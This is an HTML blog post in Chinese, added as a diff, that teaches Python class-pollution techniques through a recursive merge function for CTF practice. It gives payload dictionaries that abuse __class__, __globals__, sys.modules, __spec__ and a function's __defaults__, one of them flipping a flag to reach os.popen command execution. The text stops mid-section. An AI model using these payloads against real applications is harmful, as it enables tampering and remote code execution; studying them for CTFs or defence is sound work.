@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>Python Prototype chains pollution | Hugo</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="">
+<meta name="generator" content="Hugo 0.128.2">
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+ 
+  
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=your-google-analytics-id"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'your-google-analytics-id');
+        }
+      </script>
+    
+  
+
+
+
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+    
+        <a href="/"> <span class="arrow">←</span>Home</a>
+    
+    <a href="/posts">Archive</a>
+    <a href="/tags">Tags</a>
+    <a href="/about">About</a>
+    <a href="/friend">friend</a>
+
+    
+
+    
+        
+        
+    
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">Python Prototype chains pollution</h1>
+
+    <div class="tip">
+        <time datetime="2024-07-11 21:55:20 &#43;0800 CST">Jul 11, 2024</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          3753 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          8 minute read
+        </span>
+    </div>
+
+    
+    
+        
+  
+    <aside class="toc">
+      <details>
+          <summary>Table of Contents
+          </summary>
+          <div>
+              <nav id="TableOfContents">
+  <ul>
+    <li><a href="#_globals__">_\globals__</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#module-sys">Module sys</a></li>
+    <li><a href="#loader加载器">Loader加载器</a>
+      <ul>
+        <li><a href="#about-spec">about spec</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#函数形参">函数形参</a>
+      <ul>
+        <li><a href="#__defaults__">__defaults__</a></li>
+        <li><a href="#__kwdefaluts__">__kwdefaluts__</a></li>
+      </ul>
+    </li>
+    <li><a href="#特定值污染">特定值污染</a>
+      <ul>
+        <li><a href="#环境变量污染">环境变量污染</a></li>
+        <li><a href="#flask特定属性污染">flask特定属性污染</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#ctfshow西瓜杯">CTFshow西瓜杯</a></li>
+    <li><a href="#downunderctf-2024---co2">DownUnderCTF 2024 - co2</a></li>
+  </ul>
+</nav>
+          </div>
+      </details>
+    </aside>
+  
+
+
+    
+
+
+    <div class="content">
+      <h1 id="前言">前言 <a href="#%e5%89%8d%e8%a8%80" class="anchor">🔗</a></h1><p>在研究了Nodejs原型链污染之后，我注意到了国赛中出现的一个知识点Python原型链污染，同时我注意到CTFSHOW上的一个题目，于是我开始学习它并写了这篇简单的文章。</p>
+<h1 id="从merge开始">从Merge开始 <a href="#%e4%bb%8emerge%e5%bc%80%e5%a7%8b" class="anchor">🔗</a></h1><p>我们这里还是从常见的merge函数来做入手举例，因为其实对于原型链污染来说，本质上都是一个东西，只是基于不同的语言特性，某些存在局限性，但是讲到merge大家都应该想到和原型链污染有关。</p>
+<p>这里我就把这个关键的merge的定义放在这里，其实是同nodejs一样的操作</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Recursive merge function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)
+</span></span></code></pre></div><p>可以看到也是通过键值互换来进行的污染，但是这里要注意在python中的object的属性是不可以被污染的，具体的后面会说。</p>
+<p>一个最简单的实例：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):  
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Recursive merge function  </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():  
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):  
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:  
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))  
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:  
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v  
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:  
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))  
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:  
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">ctfer</span>:  
+</span></span><span style="display:flex;"><span>    flag <span style="color:#666">=</span> <span style="color:#b44">&#34;flag</span><span style="color:#b68;font-weight:bold">{fake_flag}</span><span style="color:#b44">&#34;</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Delete</span>(ctfer):  
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Chu0</span>(ctfer):  
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Kengwang</span>(ctfer):
+</span></span><span style="display:flex;"><span>	<span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>ctf1 <span style="color:#666">=</span> Delete()  
+</span></span><span style="display:flex;"><span>ctf2 <span style="color:#666">=</span> Chu0()  
+</span></span><span style="display:flex;"><span>evil_playload <span style="color:#666">=</span> {  
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__class__&#34;</span>:  
+</span></span><span style="display:flex;"><span>	{  
+</span></span><span style="display:flex;"><span>	    <span style="color:#b44">&#34;__base__&#34;</span>:  
+</span></span><span style="display:flex;"><span>		{  
+</span></span><span style="display:flex;"><span>		    <span style="color:#b44">&#34;flag&#34;</span>: <span style="color:#b44">&#34;flag</span><span style="color:#b68;font-weight:bold">{really_flag}</span><span style="color:#b44">&#34;</span>  
+</span></span><span style="display:flex;"><span>		}  
+</span></span><span style="display:flex;"><span>	}  
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(ctf1<span style="color:#666">.</span>flag)  
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(ctf2<span style="color:#666">.</span>flag)  
+</span></span><span style="display:flex;"><span>merge(evil_playload, ctf1)  
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(ctf1<span style="color:#666">.</span>flag)  
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(ctf2<span style="color:#666">.</span>flag)
+</span></span></code></pre></div><p>运行结果，可以看到是被污染的了
+<p class="markdown-image">
+  <img src="/img/pychains/1.png" alt=""  />
+</p>
+然后其他的例如修改内置属性也是ok的这里就不写了。
+记住object的属性是无法被污染的`</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>merge(evil_playload,<span style="color:#a2f">object</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(<span style="color:#a2f">object</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#TypeError: cannot set &#39;flag&#39; attribute of immutable type &#39;object&#39;</span>
+</span></span></code></pre></div><p>可以看到会报错的</p>
+<h1 id="question1">Question1 <a href="#question1" class="anchor">🔗</a></h1><p>这里就产生了一个问题，我们在上述的写法当中是利用Delete去继承了ctfer这个类的，这样子我们才可以通过基类去污染其属性值，但是如果不存在这个继承关系的时候我们应该如何去污染呢？</p>
+<h2 id="_globals__">_\globals__ <a href="#_globals__" class="anchor">🔗</a></h2><p>我们就可以去思索一下关于python的一些问题，例如在SSTI中我们是如何去获取我们可用的属性或者说方法呢？
+应该很直观就能想到，是他——<code>__globals__</code>.
+<code>__globals__</code> 是 Python 函数对象的一个属性，它返回包含函数定义时的全局变量的字典。通过这个属性，你可以访问和修改函数定义所在的模块中的全局变量。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>x <span style="color:#666">=</span> <span style="color:#666">10</span>  <span style="color:#080;font-style:italic"># 全局变量</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">my_function</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f">print</span>(x)  <span style="color:#080;font-style:italic"># 打印全局变量 x</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">modify_global_var</span>():
+</span></span><span style="display:flex;"><span>    my_function<span style="color:#666">.</span>__globals__[<span style="color:#b44">&#39;x&#39;</span>] <span style="color:#666">=</span> <span style="color:#666">20</span>  <span style="color:#080;font-style:italic"># 修改全局变量 x</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>my_function()  <span style="color:#080;font-style:italic"># 输出 10</span>
+</span></span><span style="display:flex;"><span>modify_global_var()
+</span></span><span style="display:flex;"><span>my_function()  <span style="color:#080;font-style:italic"># 输出 20</span>
+</span></span></code></pre></div><p>可以看到实例当中我们通过这个属性来改变了全局变量中的x。</p>
+<p>所以我们就可以这样去构造一下playload</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>evil_playload <span style="color:#666">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#b44">&#34;__init__&#34;</span>:{
+</span></span><span style="display:flex;"><span>		<span style="color:#b44">&#34;__globals__&#34;</span>:{
+</span></span><span style="display:flex;"><span>			<span style="color:#b44">&#34;flag&#34;</span> : <span style="color:#b44">&#34;flag</span><span style="color:#b68;font-weight:bold">{really_flag}</span><span style="color:#b44">&#34;</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这样子就可以去应对于不存在继承链的情况</p>
+<h1 id="question2">Question2 <a href="#question2" class="anchor">🔗</a></h1><p>我们再想要一个场景，虽然说在一些题目场景来说，大多都是在main.py中去import一个test.py，并且关系比较简单的时候，通常都可以利用上面的方法来进行污染，当关系比较复杂的时候就比较麻烦，例如多层import 或者导入第三方库来导入的时候比较麻烦，这里就提供了几个方法</p>
+<h2 id="module-sys">Module sys <a href="#module-sys" class="anchor">🔗</a></h2><p>我们这里就可以利用sys来实现。这个应该不用多说了</p>
+<p>main.py</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">test1</span>  
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">sys</span>  
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):  
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Recursive merge function  </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():  
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):  
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:  
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))  
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:  
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v  
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:  
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))  
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:  
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)  
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Test</span>():  
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> __init__(self):  
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">pass</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>evil_playload <span style="color:#666">=</span> {  
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__init__&#34;</span>:{  
+</span></span><span style="display:flex;"><span>        <span style="color:#b44">&#34;__globals__&#34;</span>:{  
+</span></span><span style="display:flex;"><span>            <span style="color:#b44">&#34;sys&#34;</span>:{  
+</span></span><span style="display:flex;"><span>                <span style="color:#b44">&#34;modules&#34;</span>:{  
+</span></span><span style="display:flex;"><span>                    <span style="color:#b44">&#34;test1&#34;</span>:{  
+</span></span><span style="display:flex;"><span>                        <span style="color:#b44">&#34;Test1&#34;</span>: {  
+</span></span><span style="display:flex;"><span>                            <span style="color:#b44">&#34;flag&#34;</span> :<span style="color:#b44">&#34;flag</span><span style="color:#b68;font-weight:bold">{really_flag}</span><span style="color:#b44">&#34;</span>  
+</span></span><span style="display:flex;"><span>                            }  
+</span></span><span style="display:flex;"><span>                        }  
+</span></span><span style="display:flex;"><span>                    }  
+</span></span><span style="display:flex;"><span>                }  
+</span></span><span style="display:flex;"><span>            }  
+</span></span><span style="display:flex;"><span>        }  
+</span></span><span style="display:flex;"><span>    }  
+</span></span><span style="display:flex;"><span>test <span style="color:#666">=</span> Test()  
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(test1<span style="color:#666">.</span>Test1<span style="color:#666">.</span>flag)  
+</span></span><span style="display:flex;"><span>merge(evil_playload,test)  
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(test1<span style="color:#666">.</span>Test1<span style="color:#666">.</span>flag)
+</span></span></code></pre></div><p>test1.py</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Test1</span>:  
+</span></span><span style="display:flex;"><span>    flag <span style="color:#666">=</span> <span style="color:#b44">&#34;flag</span><span style="color:#b68;font-weight:bold">{fake_flag}</span><span style="color:#b44">&#34;</span>
+</span></span></code></pre></div><h2 id="loader加载器">Loader加载器 <a href="#loader%e5%8a%a0%e8%bd%bd%e5%99%a8" class="anchor">🔗</a></h2><p>我们的sys使用是在题目环境中有给你sys的情况下才会可以使用的，但是如果题目不给你，那么sys基本上也是G了，所以咱们就着手一下其他方面</p>
+<p>为了进一步优化，这里采用方式是利用<code>Python</code>中加载器<code>loader</code>，在官方文档中给出的定义是
+<p class="markdown-image">
+  <img src="/img/pychains/2.png" alt=""  />
+</p>
+也就是加载类的东西。</p>
+<h3 id="about-spec">about spec <a href="#about-spec" class="anchor">🔗</a></h3><p><code>__spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__['sys']</code>获取到<code>sys</code>模块</p>
+<p>所以我们就可以利用任意的类来进行加载sys从而达到前面的目的
+这里有个demo可以看看‘</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">math</span>  
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"># 获取模块的loader  </span>
+</span></span><span style="display:flex;"><span>loader <span style="color:#666">=</span> math<span style="color:#666">.</span>__spec__<span style="color:#666">.</span>__init__<span style="color:#666">.</span>__globals__[<span style="color:#b44">&#39;sys&#39;</span>]  
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"># 打印loader信息  </span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(loader<span style="color:#666">.</span>modules)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"># {&#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;, &#39;builtins&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;, &#39;_frozen_importlib&#39;: &lt;module &#39;_frozen_importlib&#39; (frozen)&gt;, .......</span>
+</span></span></code></pre></div><p>可以看到我们就可以这么去调用从而去搭配利用打组合拳</p>
+<h1 id="默认值替换">默认值替换 <a href="#%e9%bb%98%e8%ae%a4%e5%80%bc%e6%9b%bf%e6%8d%a2" class="anchor">🔗</a></h1><h2 id="函数形参">函数形参 <a href="#%e5%87%bd%e6%95%b0%e5%bd%a2%e5%8f%82" class="anchor">🔗</a></h2><p>主要用到了函数的<code>__defaults__</code>和<code>__kwdefaults__</code>这两个内置属性</p>
+<h3 id="__defaults__">__defaults__ <a href="#__defaults__" class="anchor">🔗</a></h3><p><code>__defaults__</code> 是 Python 函数对象的一个属性，它包含函数的默认参数值。<code>__defaults__</code> 返回一个包含默认参数值的元组。如果函数没有默认参数，<code>__defaults__</code> 返回 <code>None</code>。</p>
+<p>具体的内容可以看这里
+<a href="https://zhuanlan.zhihu.com/p/412273465" target="_blank" rel="noopener">python函数的位置参数(Positional)和关键字参数(keyword) - 知乎 (zhihu.com)</a></p>
+<p>根据文章的最后面，我们可以总结一下(巧记一下)：</p>
+<ul>
+<li><code>/</code>前面都为仅位置参数</li>
+<li><code>/</code> 后<code>*</code>前都为位置或关键字参数</li>
+<li><code>*</code>后都为仅关键字参数</li>
+<li>仅位置参数不可以利用<code>变量名 = 变量</code>赋值，位置或关键字参数可以利用其赋值，也可以不赋值，仅关键词参数必须用<code>变量名=值</code>来赋值</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_a</span>(var_1, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_b</span>(var_1, <span style="color:#666">/</span>, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_c</span>(var_1, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, <span style="color:#666">*</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_d</span>(var_1, <span style="color:#666">/</span>, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, <span style="color:#666">*</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_a<span style="color:#666">.</span>__defaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#(2, 3)</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_b<span style="color:#666">.</span>__defaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#(2, 3)</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_c<span style="color:#666">.</span>__defaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#(2,)</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_d<span style="color:#666">.</span>__defaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#(2,)</span>
+</span></span></code></pre></div><p>所以在污染中可以这样</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">evil</span>(arg_1 , shell <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">False</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f;font-weight:bold">not</span> shell:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f">print</span>(arg_1)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f">print</span>(<span style="color:#a2f">__import__</span>(<span style="color:#b44">&#34;os&#34;</span>)<span style="color:#666">.</span>popen(arg_1)<span style="color:#666">.</span>read())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil_playload <span style="color:#666">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#b44">&#34;__init__&#34;</span>:{
+</span></span><span style="display:flex;"><span>		<span style="color:#b44">&#34;__globals__&#34;</span>:{
+</span></span><span style="display:flex;"><span>			<span style="color:#b44">&#34;evil&#34;</span>:{
+</span></span><span style="display:flex;"><span>				<span style="color:#b44">&#34;__defaults__&#34;</span>:{
+</span></span><span style="display:flex;"><span>					<span style="color:#a2f;font-weight:bold">True</span>,
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>其实也就是我们如果去获取evil函数的defaluts属性的时候就只能获取到位置或关键字参数，所以这里的defaults默认指向的就是shell这个参数，所以就可以进行污染</p>
+<h3 id="__kwdefaluts__">__kwdefaluts__ <a href="#__kwdefaluts__" class="anchor">🔗</a></h3><p><code>__kwdefaults__</code>以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_a</span>(var_1, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_b</span>(var_1, <span style="color:#666">/</span>, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_c</span>(var_1, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, <span style="color:#666">*</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">func_d</span>(var_1, <span style="color:#666">/</span>, var_2 <span style="color:#666">=</span><span style="color:#666">2</span>, <span style="color:#666">*</span>, var_3 <span style="color:#666">=</span> <span style="color:#666">3</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_a<span style="color:#666">.</span>__kwdefaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#None</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_b<span style="color:#666">.</span>__kwdefaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#None</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_c<span style="color:#666">.</span>__kwdefaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#{&#39;var_3&#39;: 3}</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(func_d<span style="color:#666">.</span>__kwdefaults__)
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#{&#39;var_3&#39;: 3}</span>
+</span></span></code></pre></div><p>可以看到他仅获取了仅关键字参数，并且返回是以字典的形式返回的。</p>
+<p>所以同样的</p>
